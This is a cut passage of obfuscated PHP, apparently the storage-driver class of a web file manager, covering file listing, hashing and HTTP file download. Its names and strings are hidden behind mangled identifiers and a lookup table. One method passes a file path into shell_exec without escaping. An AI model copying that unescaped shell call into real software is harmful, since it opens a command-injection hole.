strtolower($‡²×—µÉ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Âª­í·, $‹Ş”ô¼¥) { $†˜ù­´ =& $_SERVER[²Ö÷öõ]; $äÉû­¿ = rtrim($Âª­í·, $†˜ù­´[8]) . $†˜ù­´[8] . $‹Ş”ô¼¥; $•ÖŒ¢Ş¥ = $this->exist($äÉû­¿); return $•ÖŒ¢Ş¥ ? $äÉû­¿ : !1; } public function setModifyTime($£¼„ü¡, $’õí»³Ñ = '') { } public function renameObject($€ó®°áÀ, $–¬²««) { $­ç³ÌëÃ = $–¬²««; $€ó®°áÀ = $this->getPathOuter($€ó®°áÀ); $–¬²«« = $this->pathFather($€ó®°áÀ) . $–¬²««; $¹¥É¥Çü = IO::copy($€ó®°áÀ, $this->pathFather($€ó®°áÀ), REPEAT_RENAME_FOLDER, $­ç³ÌëÃ); if ($¹¥É¥Çü) { IO::remove($€ó®°áÀ); } return $¹¥É¥Çü ? $–¬²«« : !1; } public function tempFile($‡™îèô = '', $­°ëÆ¥è = '') { if (!$‡™îèô) { $‡™îèô = rand_string(15); } $Œ³‹³‚« = TEMP_FILES . rand_string(15) . $_SERVER[²Ö÷öõ][8]; @mkdir($Œ³‹³‚«, DEFAULT_PERRMISSIONS, !0); $ôÓ–Áâ = $Œ³‹³‚« . $‡™îèô; @touch($ôÓ–Áâ); if ($­°ëÆ¥è) { file_put_contents($ôÓ–Áâ, $­°ëÆ¥è); } return $ôÓ–Áâ; } public function tempFileRemve($Ó¯¬ù”) { @unlink($Ó¯¬ù”); @rmdir($this->pathFather($Ó¯¬ù”)); } public function mkfile($ª‡ÔƒÑå, $ş˜Ñ“³ç = '', $²¤ôÀ· = REPEAT_RENAME) { } public function mkdir($äüöû, $ÍµŸ›¢« = REPEAT_SKIP) { } public function delFile($¬ƒ™ÚÊ) { } public function delFolder($§–î©¯©) { } public function copyFile($·¹¢¶, $ãµ×Ş“Ù) { } public function moveFile($·•øş¢Ó, $òğ«Ù˜) { } public function remove($‡²õËı„) { if ($this->isFile($‡²õËı„)) { return $this->delFile($‡²õËı„); } return $this->delFolder($‡²õËı„); } public function rename($Ã¸¦¬•­, $®§òƒ¿ƒ) { } public function exist($ûäÆ™â®) { } public function findByHash($ˆ‹Ãä‹Ö = '', $É²›÷›ø = '') { return !1; } public function isFile($ÍÙİä Í) { } public function isFolder($Í§ö¶•˜) { } public function size($æ»”™±‘) { } public function info($¸Â®øë©) { } public function infoSimple($ªí€©­ü) { return $this->info($ªí€©­ü); } public function infoAuth($»—êë) { return $this->info($»—êë); } public function infoFull($á‹İ®¸©) { return $this->info($á‹İ®¸©); } public function infoFullSimple($ÉŒØ‹Éé) { return $this->info($ÉŒØ‹Éé); } public function infoWithChildren($îĞÔÍë®) { $ÚÙÙÙî” =& $_SERVER[²Ö÷öõ]; static $îñù‹² = array(); if (isset($îñù‹²[$îĞÔÍë®])) { return $îñù‹²[$îĞÔÍë®]; } $µ¤ëÀµ¢ = $this->info($îĞÔÍë®); if ($µ¤ëÀµ¢ && $µ¤ëÀµ¢[$ÚÙÙÙî”[33]] == $ÚÙÙÙî”[78]) { $¾ÖÄÄ¢å = array($ÚÙÙÙî”[79] => 0, $ÚÙÙÙî”[80] => 0, $ÚÙÙÙî”[81] => 0); $this->infoChildren($îĞÔÍë®, $¾ÖÄÄ¢å); $µ¤ëÀµ¢[$ÚÙÙÙî”[79]] = $¾ÖÄÄ¢å[$ÚÙÙÙî”[79]]; $µ¤ëÀµ¢[$ÚÙÙÙî”[82]] = array($ÚÙÙÙî”[83] => $¾ÖÄÄ¢å[$ÚÙÙÙî”[80]], $ÚÙÙÙî”[84] => $¾ÖÄÄ¢å[$ÚÙÙÙî”[81]]); $îñù‹²[$îĞÔÍë®] = $µ¤ëÀµ¢; } return $µ¤ëÀµ¢; } public function listPath($¹§µÅà°, $ßå…Äë° = false) { } public function has($¼ÀÕõßÀ, $Å¦…¦á = false, $”åÍĞÓ = false) { } public function canRead($‘§ÇŞ³…) { } public function canWrite($ÃÊ§Æø¤) { } public function getContent($ó¬†¤¯„) { } public function setContent($ã¹µŒâ†, $ˆØ¡ÒŠĞ = '') { } protected function infoChildren($Ö…½«†Ù, &$ÜİÒÂØ) { $»Ò‘ËÌ… =& $_SERVER[²Ö÷öõ]; check_abort_echo(); $ŠèËŞâÃ = $this->listPath($Ö…½«†Ù, !0); $ŠèËŞâÃ = array_merge($ŠèËŞâÃ[$»Ò‘ËÌ…[85]], $ŠèËŞâÃ[$»Ò‘ËÌ…[86]]); foreach ($ŠèËŞâÃ as $»°ÇæÕÙ) { if ($»°ÇæÕÙ[$»Ò‘ËÌ…[33]] == $»Ò‘ËÌ…[78]) { $ÜİÒÂØ[$»Ò‘ËÌ…[81]]++; $¥ÄŠó÷ = $this->getPathInner($»°ÇæÕÙ[$»Ò‘ËÌ…[87]]); $this->infoChildren($¥ÄŠó÷, $ÜİÒÂØ); } else { $ÜİÒÂØ[$»Ò‘ËÌ…[80]]++; $ÜİÒÂØ[$»Ò‘ËÌ…[79]] += $»°ÇæÕÙ[$»Ò‘ËÌ…[79]]; } } } public function fileSubstr($Ñ½Ùî“È, $¡Üèà·, $éŸµ®ôè) { } public function listAll($ŠòÕüÈª) { } public function listAllMake($­©¾ÁâŸ, &$¾Åú¯¸) { $Ñ„•¥‰õ =& $_SERVER[²Ö÷öõ]; check_abort_echo(); $”›˜Ôí = $this->listPath($­©¾ÁâŸ, !0); if (!$”›˜Ôí) { return; } $Ö®Ñâ¹í = array_merge($”›˜Ôí[$Ñ„•¥‰õ[85]], $”›˜Ôí[$Ñ„•¥‰õ[86]]); foreach ($Ö®Ñâ¹í as $ÁğƒĞ¨å) { $Ë÷ˆ…ñú = $ÁğƒĞ¨å[$Ñ„•¥‰õ[33]] == $Ñ„•¥‰õ[78]; $¼ö«Ï´” = array($Ñ„•¥‰õ[87] => $ÁğƒĞ¨å[$Ñ„•¥‰õ[87]], $Ñ„•¥‰õ[78] => $Ë÷ˆ…ñú); if (isset($ÁğƒĞ¨å[$Ñ„•¥‰õ[79]])) { $¼ö«Ï´”[$Ñ„•¥‰õ[79]] = $ÁğƒĞ¨å[$Ñ„•¥‰õ[79]]; } if (isset($ÁğƒĞ¨å[$Ñ„•¥‰õ[88]])) { $¼ö«Ï´”[$Ñ„•¥‰õ[88]] = $ÁğƒĞ¨å[$Ñ„•¥‰õ[88]]; } if (!$Ë÷ˆ…ñú) { $¾Åú¯¸[] = $¼ö«Ï´”; continue; } $¾Åú¯¸[] = $¼ö«Ï´”; $ë¾ó¹ŸÙ = $ÁğƒĞ¨å[$Ñ„•¥‰õ[87]]; $ˆ·²ôÀ’ = $this->pathDriver; if (substr($ÁğƒĞ¨å[$Ñ„•¥‰õ[87]], 0, strlen($ˆ·²ôÀ’)) == $ˆ·²ôÀ’) { $ë¾ó¹ŸÙ = substr($ë¾ó¹ŸÙ, strlen($ˆ·²ôÀ’)); } $this->listAllMake($ë¾ó¹ŸÙ, $¾Åú¯¸); } } public function listAllSimple($ñ¤‚°Ä¸, $ÂÖ—¦×¢ = false) { $Šàè¦š = $this->listAll($ñ¤‚°Ä¸); return $this->listAllSimpleMake($Šàè¦š, $this->getPathOuter($ñ¤‚°Ä¸), $ÂÖ—¦×¢); } public function listAllSimpleMake($¬½ºÃ, $Ø¤ÇöÁ, $ˆŸäãñ“) { $ÕÎ˜øê =& $_SERVER[²Ö÷öõ]; $ûäƒŸ·Ó = array(); $Ø¤ÇöÁ = rtrim(get_path_father($Ø¤ÇöÁ), $ÕÎ˜øê[8]) . $ÕÎ˜øê[8]; foreach ($¬½ºÃ as $áÏÙ·Ãş) { $çà‡·Ñ = array($ÕÎ˜øê[87] => $áÏÙ·Ãş[$ÕÎ˜øê[87]], $ÕÎ˜øê[89] => $áÏÙ·Ãş[$ÕÎ˜øê[87]], $ÕÎ˜øê[78] => $áÏÙ·Ãş[$ÕÎ˜øê[78]]); if (isset($áÏÙ·Ãş[$ÕÎ˜øê[79]]) && !$áÏÙ·Ãş[$ÕÎ˜øê[78]]) { $çà‡·Ñ[$ÕÎ˜øê[79]] = $áÏÙ·Ãş[$ÕÎ˜øê[79]]; } if (isset($áÏÙ·Ãş[$ÕÎ˜øê[88]])) { $çà‡·Ñ[$ÕÎ˜øê[88]] = $áÏÙ·Ãş[$ÕÎ˜øê[88]]; } if (is_array($áÏÙ·Ãş[$ÕÎ˜øê[90]])) { $çà‡·Ñ[$ÕÎ˜øê[89]] = $áÏÙ·Ãş[$ÕÎ˜øê[90]][$ÕÎ˜øê[87]]; $çà‡·Ñ[$ÕÎ˜øê[79]] = $áÏÙ·Ãş[$ÕÎ˜øê[90]][$ÕÎ˜øê[79]]; $çà‡·Ñ[$ÕÎ˜øê[88]] = $áÏÙ·Ãş[$ÕÎ˜øê[90]][$ÕÎ˜øê[88]]; } else { if (substr($áÏÙ·Ãş[$ÕÎ˜øê[87]], 0, strlen($Ø¤ÇöÁ)) == $Ø¤ÇöÁ) { $çà‡·Ñ[$ÕÎ˜øê[87]] = substr($áÏÙ·Ãş[$ÕÎ˜øê[87]], strlen($Ø¤ÇöÁ)); } } $Ùğíß· = $áÏÙ·Ãş[$ÕÎ˜øê[78]] ? $ÕÎ˜øê[8] : $ÕÎ˜øê[12]; $çà‡·Ñ[$ÕÎ˜øê[89]] = rtrim($çà‡·Ñ[$ÕÎ˜øê[89]], $ÕÎ˜øê[8]) . $Ùğíß·; $çà‡·Ñ[$ÕÎ˜øê[87]] = $ÕÎ˜øê[8] . trim($çà‡·Ñ[$ÕÎ˜øê[87]], $ÕÎ˜øê[8]) . $Ùğíß·; if (!$ˆŸäãñ“) { $‰Ş›Êúš = explode($ÕÎ˜øê[8], trim($çà‡·Ñ[$ÕÎ˜øê[87]], $ÕÎ˜øê[8])); $çà‡·Ñ[$ÕÎ˜øê[87]] = $ÕÎ˜øê[8] . implode($ÕÎ˜øê[8], array_slice($‰Ş›Êúš, 1)) . $Ùğíß·; } $ûäƒŸ·Ó[] = $çà‡·Ñ; } return array_sort_by($ûäƒŸ·Ó, $ÕÎ˜øê[87]); } public function upload($ÑÏÕ³©, $†€Éï×ç, $“Ğ«‡· = false, $È¥Ä‘Í” = REPEAT_REPLACE) { } public function uploadFileByID($ùÁê¡ôğ, $¯•Õ¾´, $Û¬‚«Ğ) { } public function uploadFileByPath($Ğ†íùÄ, $åúÒÅÄá, $†¹¿»„ç = array()) { } public function isUploadServer() { $¢‡ÚÉ‹ =& $_SERVER[²Ö÷öõ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¢‡ÚÉ‹[91]) { return !0; } return $GLOBALS[$¢‡ÚÉ‹[6]][$¢‡ÚÉ‹[92]][$¢‡ÚÉ‹[93]]; } public function isFileOutServer() { $Á½¥’öè =& $_SERVER[²Ö÷öõ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Á½¥’öè[91]) { return !0; } return $GLOBALS[$Á½¥’öè[6]][$Á½¥’öè[92]][$Á½¥’öè[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($†á¾Œƒ) { $Şº°£ÍÌ =& $_SERVER[²Ö÷öõ]; if (!$this->isCdnHost()) { return $†á¾Œƒ; } return str_replace(trim(get_url_root($†á¾Œƒ), $Şº°£ÍÌ[8]), trim($this->cdnHost, $Şº°£ÍÌ[8]), $†á¾Œƒ); } public function uploadLink($Ììóˆ, $Œî²†Ä½ = 0) { $“±õİ… =& $_SERVER[²Ö÷öõ]; if ($this->isUploadServer()) { return; } $««í†“» = $this->getType(); if (!in_array($««í†“», $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¼µÖõöÔ = 1024 * 1024 * 10; $öşäæÖÃ = $Œî²†Ä½ <= $¼µÖõöÔ ? $“±õİ…[95] : $“±õİ…[96]; $®ßç…´Å = (!$Œî²†Ä½ ? 1 : ceil($Œî²†Ä½ / pow(1024, 3))) * 3600 * 4; $€…‰È = $this->{$öşäæÖÃ}($Ììóˆ, $®ßç…´Å); if ($€…‰È) { $€…‰È[$“±õİ…[97]] = $Ììóˆ; $€…‰È[$“±õİ…[98]] = $««í†“»; } return $€…‰È; } public function uploadFormData($ÓÈØĞì¦, $Ç¥½çöİ = 3600) { } public function multiUploadFormData($ƒ¯ÒÕ¢Ç, $·æ†¼êÊ = 3600) { } public function download($óÓ‚Œ€®, $§ƒàì¯İ) { } public function ext($£Õ÷¢¢Ğ) { $‰æûõœÊ =& $_SERVER[²Ö÷öõ]; if (strpos($£Õ÷¢¢Ğ, $‰æûõœÊ[8]) === -1) { $œä”Æ¯Š = $£Õ÷¢¢Ğ; } else { $œä”Æ¯Š = $this->pathThis($£Õ÷¢¢Ğ); } $İÛÜœÃ‚ = $‰æûõœÊ[12]; if (strstr($œä”Æ¯Š, $‰æûõœÊ[10])) { $İÛÜœÃ‚ = substr($œä”Æ¯Š, strrpos($œä”Æ¯Š, $‰æûõœÊ[10]) + 1); $İÛÜœÃ‚ = strtolower($İÛÜœÃ‚); } if (strlen($İÛÜœÃ‚) > 3 && preg_match($‰æûõœÊ[99], $İÛÜœÃ‚, $¤‰£ş‹Õ)) { $İÛÜœÃ‚ = $‰æûõœÊ[12]; } return $İÛÜœÃ‚; } public function pathThis($ªñÓ¿Ó´) { $»õ¥Ğ‚Ñ =& $_SERVER[²Ö÷öõ]; $ªñÓ¿Ó´ = str_replace($»õ¥Ğ‚Ñ[100], $»õ¥Ğ‚Ñ[8], rtrim($ªñÓ¿Ó´, $»õ¥Ğ‚Ñ[8])); $¶‚¢½ÉÒ = strrpos($ªñÓ¿Ó´, $»õ¥Ğ‚Ñ[8]); if ($¶‚¢½ÉÒ === !1) { return $ªñÓ¿Ó´; } return substr($ªñÓ¿Ó´, $¶‚¢½ÉÒ + 1); } public function pathFather($é‘ª¥‡Ó) { $”Ó£§Ë =& $_SERVER[²Ö÷öõ]; $é‘ª¥‡Ó = str_replace($”Ó£§Ë[100], $”Ó£§Ë[8], rtrim($é‘ª¥‡Ó, $”Ó£§Ë[8])); $ŠÍÏ´°Á = strrpos($é‘ª¥‡Ó, $”Ó£§Ë[8]); if ($ŠÍÏ´°Á === !1) { return $”Ó£§Ë[12]; } return substr($é‘ª¥‡Ó, 0, $ŠÍÏ´°Á + 1); } public function hashSimple($¤ü±ÉŞ‡) { $ºÙéôıä =& $_SERVER[²Ö÷öõ]; if (!$¤ü±ÉŞ‡) { return md5($ºÙéôıä[12]); } $·Ô‘Ö«î = $this->size($¤ü±ÉŞ‡); $Şøü·üÛ = 200; $®˜­î« = 50; if ($·Ô‘Ö«î <= $Şøü·üÛ * $®˜­î«) { return $this->hashMd5($¤ü±ÉŞ‡) . $·Ô‘Ö«î; } $‚ÛëÒÄ… = intval($·Ô‘Ö«î / $®˜­î«); $ßÓÈÌï‰ = $ºÙéôıä[12]; for ($ïÆâ¢” = 0; $ïÆâ¢” < $®˜­î«; $ïÆâ¢”++) { $ßÓÈÌï‰ .= $this->fileSubstr($¤ü±ÉŞ‡, $‚ÛëÒÄ… * $ïÆâ¢”, $Şøü·üÛ); } $ßÓÈÌï‰ .= $this->fileSubstr($¤ü±ÉŞ‡, $·Ô‘Ö«î - $Şøü·üÛ, $Şøü·üÛ); return md5($ßÓÈÌï‰) . $·Ô‘Ö«î; } public static $md5Cache = array(); public function hashMd5($’¦½ç‡) { if (!$’¦½ç‡) { return md5($_SERVER[²Ö÷öõ][12]); } $’¦½ç‡ = $this->iconvSystem($’¦½ç‡); if (isset(self::$md5Cache[$’¦½ç‡])) { return self::$md5Cache[$’¦½ç‡]; } self::$md5Cache[$’¦½ç‡] = $this->hashMd5Shell($’¦½ç‡); if (!self::$md5Cache[$’¦½ç‡]) { self::$md5Cache[$’¦½ç‡] = @md5_file($’¦½ç‡); } return self::$md5Cache[$’¦½ç‡]; } private function hashMd5Shell($µâÔ³) { $Ùè‘Ò·Œ =& $_SERVER[²Ö÷öõ]; if (!$µâÔ³) { return md5($Ùè‘Ò·Œ[12]); } if (!function_exists($Ùè‘Ò·Œ[101])) { return !1; } $Û²ª¯½€ = array($Ùè‘Ò·Œ[102], $Ùè‘Ò·Œ[103]); $½É‚ÀÃÙ = Cache::get($Ùè‘Ò·Œ[104]); if (!$½É‚ÀÃÙ) { $¹¢±” = BASIC_PATH . $Ùè‘Ò·Œ[105]; $‹‹–éåÚ = md5_file($¹¢±”); $½É‚ÀÃÙ = $Ùè‘Ò·Œ[106]; foreach ($Û²ª¯½€ as $ôª›¢…‰) { $áˆå¿áù = shell_exec($ôª›¢…‰ . "\40\x22{$¹¢±”}\42"); if ($áˆå¿áù && substr(trim($áˆå¿áù), 0, 32) == $‹‹–éåÚ) { $½É‚ÀÃÙ = $ôª›¢…‰; break; } } Cache::set($Ùè‘Ò·Œ[104], $½É‚ÀÃÙ, 3600); } if ($½É‚ÀÃÙ == $Ùè‘Ò·Œ[106]) { return !1; } $áˆå¿áù = shell_exec($½É‚ÀÃÙ . "\40\42{$µâÔ³}\x22"); $áˆå¿áù = str_replace($Ùè‘Ò·Œ[107], $Ùè‘Ò·Œ[12], $áˆå¿áù); return substr($áˆå¿áù, 0, 32); } public function link($ŞœÍ‰) { return $ŞœÍ‰; } public function fileOut($ƒ¬…åóâ, $Êïœ™ÄÙ = false, $èÛ¿èâÄ = false, $·®Â´ = '') { $„ğİÙÇ =& $_SERVER[²Ö÷öõ]; $this->cacheMethod(null, null); if (!$ƒ¬…åóâ || !$this->exist($ƒ¬…åóâ)) { show_json(LNG($„ğİÙÇ[108]), !1, $èÛ¿èâÄ); } $ËØÏí = $this->getType() == $„ğİÙÇ[109]; $ß™Áşìè = $GLOBALS[$„ğİÙÇ[6]][$„ğİÙÇ[92]][$„ğİÙÇ[110]][$„ğİÙÇ[111]]; $å‚­Şš = (double) $GLOBALS[$„ğİÙÇ[6]][$„ğİÙÇ[92]][$„ğİÙÇ[110]][$„ğİÙÇ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¯™Ãô¡ö = $this->infoFull($ƒ¬…åóâ); $ßÎŒ‡éû = $¯™Ãô¡ö[$„ğİÙÇ[79]]; $²®ë³¥ö = gmdate($„ğİÙÇ[113], $¯™Ãô¡ö[$„ğİÙÇ[88]]); $Ù›œ²ñÆ = $èÛ¿èâÄ ? $èÛ¿èâÄ : $this->iconvApp($¯™Ãô¡ö[$„ğİÙÇ[32]]); $àóÂ”© = 0; $õ×ÛÆµ£ = $ßÎŒ‡éû - 1; $£ÓÓá¹ = $this->ext($Ù›œ²ñÆ); if (in_array($£ÓÓá¹, array($„ğİÙÇ[114], $„ğİÙÇ[115], $„ğİÙÇ[116], $„ğİÙÇ[117]))) { $£ÓÓá¹ = $„ğİÙÇ[118]; } if (in_array($£ÓÓá¹, array($„ğİÙÇ[119]))) { $£ÓÓá¹ = $„ğİÙÇ[120]; } if (!$·®Â´) { $·®Â´ = md5($²®ë³¥ö . $ßÎŒ‡éû); } $·®Â´ = $„ğİÙÇ[121] . $·®Â´ . $„ğİÙÇ[121]; $ùÁÈµùÄ = get_file_mime($£ÓÓá¹); $ÚóÎÃÄ = !0; $ÚóÎÃÄ = isset($_GET[$„ğİÙÇ[122]]) ? !1 : !0; if ($Êïœ™ÄÙ === !1 && !mime_support($ùÁÈµùÄ)) { $ùÁÈµùÄ = $„ğİÙÇ[123]; } header($„ğİÙÇ[124]); header($„ğİÙÇ[125] . $ùÁÈµùÄ); $÷ ØÅ…ş = rawurlencode($Ù›œ²ñÆ); $÷ ØÅ…ş = $„ğİÙÇ[121] . $÷ ØÅ…ş . $„ğİÙÇ[126] . $÷ ØÅ…ş; if ($Êïœ™ÄÙ) { header($„ğİÙÇ[127]); header($„ğİÙÇ[128] . $÷ ØÅ…ş); } else { if ($ÚóÎÃÄ) { header($„ğİÙÇ[129] . $÷ ØÅ…ş); } } $Ÿè³îÏ™ = 3600 * 24 * 30; header($„ğİÙÇ[130]); header($„ğİÙÇ[131]); header($„ğİÙÇ[132] . $Ÿè³îÏ™); header($„ğİÙÇ[133] . gmdate($„ğİÙÇ[113], time() + $Ÿè³îÏ™) . $„ğİÙÇ[134]); if (isset($_SERVER[$„ğİÙÇ[135]]) && strtotime($_SERVER[$„ğİÙÇ[135]]) == $¯™Ãô¡ö[$„ğİÙÇ[88]]) { header($„ğİÙÇ[136], !0, 304); die; } if (isset($_SERVER[$„ğİÙÇ[137]]) && $_SERVER[$„ğİÙÇ[137]] == $·®Â´) { header($„ğİÙÇ[138] . $·®Â´, !0, 304); die; } header($„ğİÙÇ[138] . $·®Â´); header($„ğİÙÇ[139] . $²®ë³¥ö . $„ğİÙÇ[134]); header($„ğİÙÇ[140] . $Ù›œ²ñÆ); header($„ğİÙÇ[141]); header($„ğİÙÇ[142] . $ßÎŒ‡éû); header($„ğİÙÇ[143]); Hook::trigger($„ğİÙÇ[144], $ƒ¬…åóâ, $ßÎŒ‡éû, $Ù›œ²ñÆ, $£ÓÓá¹); if (!$Êïœ™ÄÙ && $£ÓÓá¹ == $„ğİÙÇ[145]) { if ($ßÎŒ‡éû > 1024 * 1024 * 5) { die; } $°²€åÌå = $this->getContent($ƒ¬…åóâ); $°²€åÌå = Html::clearSVG($°²€åÌå); header($„ğİÙÇ[146] . strlen($°²€åÌå)); echo $°²€åÌå; die; } $ööŞä¥Ö = strtolower($_SERVER[$„ğİÙÇ[147]]); if ($ËØÏí && $ööŞä¥Ö && $ß™Áşìè) { if (strstr($ööŞä¥Ö, $„ğİÙÇ[148])) { header($„ğİÙÇ[149] . $ƒ¬…åóâ); } else { if (strstr($ööŞä¥Ö, $„ğİÙÇ[150])) { header($„ğİÙÇ[151] . $ƒ¬…åóâ); } else { if (strstr($ööŞä¥Ö, $„ğİÙÇ[152])) { header($„ğİÙÇ[153] . $ƒ¬…åóâ); } } } if ($å‚­Şš) { header($„ğİÙÇ[154] . $å‚­Şš); } return; } if (isset($_SERVER[$„ğİÙÇ[155]])) { if (preg_match($„ğİÙÇ[156], $_SERVER[$„ğİÙÇ[155]], $ŒüƒèÔ‡)) { $àóÂ”© = intval($ŒüƒèÔ‡[1]); $àóÂ”© = $àóÂ”© <= 0 ? 0 : ($àóÂ”© >= $õ×ÛÆµ£ ? $õ×ÛÆµ£ : $àóÂ”©); if (!empty($ŒüƒèÔ‡[2])) { $í¤ˆµŸ = intval($ŒüƒèÔ‡[2]); $õ×ÛÆµ£ = $í¤ˆµŸ < $àóÂ”© ? $àóÂ”© : ($í¤ˆµŸ >= $õ×ÛÆµ£ ? $õ×ÛÆµ£ : $í¤ˆµŸ); } } header($„ğİÙÇ[157]); header("\x43\x6f\x6e\164\145\156\x74\55\x52\141\156\x67\145\72\40\142\x79\164\145\x73\40{$àóÂ”©}\x2d{$õ×ÛÆµ£}\x2f" . $ßÎŒ‡éû); } else { header($„ğİÙÇ[158]); } header($„ğİÙÇ[159]); header($„ğİÙÇ[160]); $±Ñè£®¾ = !0; if ($_SERVER[$„ğİÙÇ[161]] == $„ğİÙÇ[162] && $ßÎŒ‡éû > 1204 * 1024 * 1024 * 2) { $±Ñè£®¾ = !1; } if ($±Ñè£®¾) { header($„ğİÙÇ[163] . ($õ×ÛÆµ£ - $àóÂ”© + 1)); } if ($_SERVER[$„ğİÙÇ[164]] == $„ğİÙÇ[165]) { return; } $şÈÖ°Òì = array($„ğİÙÇ[166] => !1, $„ğİÙÇ[167] => $àóÂ”©, $„ğİÙÇ[168] => $õ×ÛÆµ£, $„ğİÙÇ[169] => $£ÓÓá¹, $„ğİÙÇ[170] => $¯™Ãô¡ö, $„ğİÙÇ[171] => $„ğİÙÇ[12], $„ğİÙÇ[172] => 0); $şÈÖ°Òì = Hook::filter($„ğİÙÇ[173], $şÈÖ°Òì); $—ØŠ³ß‡ = 1024 * 300; $˜ÁÓÊíÄ = 0; if ($å‚­Şš) { $˜ÁÓÊíÄ = intval(1000 * 1000 * ($—ØŠ³ß‡ / $å‚­Şš)); } while ($àóÂ”© <= $õ×ÛÆµ£) { $£¾Ÿ° = timeFloat(); check_abort(); $ĞÄ²Û— = $õ×ÛÆµ£ - $àóÂ”© + 1; if ($ĞÄ²Û— <= $—ØŠ³ß‡) { $—ØŠ³ß‡ = $ĞÄ²Û—; } $°²€åÌå = $this->fileSubstr($ƒ¬…åóâ, $àóÂ”©, $—ØŠ³ß‡); if ($şÈÖ°Òì[$„ğİÙÇ[166]]) { $şÈÖ°Òì[$„ğİÙÇ[171]] = $°²€åÌå; $şÈÖ°Òì[$„ğİÙÇ[172]] = $àóÂ”©; $şÈÖ°Òì = Hook::filter($„ğİÙÇ[174], $şÈÖ°Òì); $°²€åÌå = $şÈÖ°Òì[$„ğİÙÇ[171]]; } echo $°²€åÌå; $àóÂ”© += $—ØŠ³ß‡; if ($—ØŠ³ß‡ == $ĞÄ²Û—) { $àóÂ”© = $õ×ÛÆµ£ + 1; } if ($˜ÁÓÊíÄ) { $³ èÑò = intval(1000 * 1000 * (timeFloat() - $£¾Ÿ°)); $»ÂÙçËÂ = $˜ÁÓÊíÄ - $³ èÑò; if ($»ÂÙçËÂ > 5) { usleep($»ÂÙçËÂ); } } } } public function fileOutServer($‡Œ˜Ø•ü, $äĞ‚ñ… = false, $ã—Š›¶‚ = false, $”™Áõæç = '') { $this->fileOut($‡Œ˜Ø•ü, $äĞ‚ñ…, $ã—Š›¶‚, $”™Áõæç); } public function fileOutLink($ä˜ÔğÀ²) { header($_SERVER[²Ö÷öõ][175] . $ä˜ÔğÀ²); die; } public function cacheMethod($®öÑ‘Ó, $ëÆûïÛ’, $íİƒ¨« = null) { $¯Şáë“ =& $_SERVER[²Ö÷öõ]; static $Ğ„üâŠú = array(); $å¨ÉÖ» = $ëÆûïÛ’ ? ltrim($this->getPathOuter($ëÆûïÛ’), $¯Şáë“[8]) : $¯Şáë“[12]; $øØö£­˜ = $¯Şáë“[176] . $®öÑ‘Ó . $¯Şáë“[177] . rtrim($å¨ÉÖ», $¯Şáë“[8]); if (is_null($®öÑ‘Ó)) { $Ğ„üâŠú = array(); return; } if (is_null($ëÆûïÛ’)) { foreach ($Ğ„üâŠú as $øØö£­˜ => $Ô£òö¼á) { if (!strstr($øØö£­˜, $¯Şáë“[176] . $®öÑ‘Ó . $¯Şáë“[178])) { continue; } unset($Ğ„üâŠú[$øØö£­˜]); } return; } if (!is_null($íİƒ¨«)) { $Ğ„üâŠú[$øØö£­˜] = $íİƒ¨«; return; } $¾İÙŸË‡ = isset($Ğ„üâŠú[$øØö£­˜]) ? $Ğ„üâŠú[$øØö£­˜] : null; if (!is_null($¾İÙŸË‡)) { return $¾İÙŸË‡; } $¾İÙŸË‡ = $this->{$®öÑ‘Ó}($ëÆûïÛ’); $Ğ„üâŠú[$øØö£­˜] = $¾İÙŸË‡; return $¾İÙŸË‡; } public function cacheMethodInfoSet($ü´üæé°, $¿Ëòƒªù, $€øÉÍ­ö = false) { $Ú°®œ ´ =& $_SERVER[²Ö÷öõ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ú°®œ ´[179], $ü´üæé°, $¿Ëòƒªù); $this->cacheMethod($Ú°®œ ´[180], $ü´üæé°, $¿Ëòƒªù ? !1 : !0); if (is_array($€øÉÍ­ö)) { $this->cacheMethod($Ú°®œ ´[181], $ü´üæé°, $€øÉÍ­ö); } } public function fileOutImage($¨ÍŒµà, $ÀÁÙÄ¦Ï = 250) { $¸óÕî¿Ó =& $_SERVER[²Ö÷öõ]; set_timeout(); if (substr($¨ÍŒµà, 0, 4) == $¸óÕî¿Ó[152]) { $this->fileOutLink($¨ÍŒµà); } $ƒó†Ÿ‘Ÿ = $this->info($¨ÍŒµà); $‹Ã§ıı = !1; $®³÷”°“ = isset($GLOBALS[$¸óÕî¿Ó[182]]) ? $GLOBALS[$¸óÕî¿Ó[182]] : array(); if ($®³÷”°“ && $®³÷”°“[$¸óÕî¿Ó[183]] == $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[87]]) { $ƒó†Ÿ‘Ÿ = $®³÷”°“; $Ñ‰©±ñ÷ = $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[184]]; if ($Ñ‰©±ñ÷ && isset($Ñ‰©±ñ÷[$¸óÕî¿Ó[185]])) { if ($Ñ‰©±ñ÷[$¸óÕî¿Ó[185]] <= $ÀÁÙÄ¦Ï && $Ñ‰©±ñ÷[$¸óÕî¿Ó[186]] <= $ÀÁÙÄ¦Ï) { $‹Ã§ıı = !0; } } } if ($ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[79]] <= 1024 * 50 || $‹Ã§ıı || !function_exists($¸óÕî¿Ó[187]) || $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[169]] == $¸óÕî¿Ó[188]) { return $this->fileOut($¨ÍŒµà, !1, $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[32]]); } $ªı’÷àÂ = kodIO::hashPath($ƒó†Ÿ‘Ÿ); $Èş–ÕÙã = "\x63\x6f\x76\x65\x72\137{$ªı’÷àÂ}\137{$ÀÁÙÄ¦Ï}\x2e\x70\156\147"; $ÓüÃ¤Êƒ = IO_PATH_SYSTEM_TEMP . $¸óÕî¿Ó[189]; $Ã©¿úµé = IO::infoFullSimple($ÓüÃ¤Êƒ); $æàôÍâ‘ = $Ã©¿úµé && is_array($Ã©¿úµé) ? $Ã©¿úµé[$¸óÕî¿Ó[87]] : $¸óÕî¿Ó[12]; if (!$æàôÍâ‘) { $æàôÍâ‘ = IO::mkdir($ÓüÃ¤Êƒ); } if 